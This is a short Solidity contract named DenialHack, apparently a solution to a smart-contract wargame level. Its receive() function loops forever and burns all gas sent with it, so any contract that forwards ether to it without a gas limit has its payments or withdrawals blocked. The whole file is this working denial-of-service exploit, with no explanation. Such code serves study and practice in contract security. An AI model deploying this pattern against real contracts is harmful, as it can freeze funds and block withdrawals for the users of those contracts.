// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract DenialHack {

    // random function to burn gas
    function burngas() public {
        1+1;
    }

    receive() external payable {
        while(1==1){
            burngas();
        }
    }

}
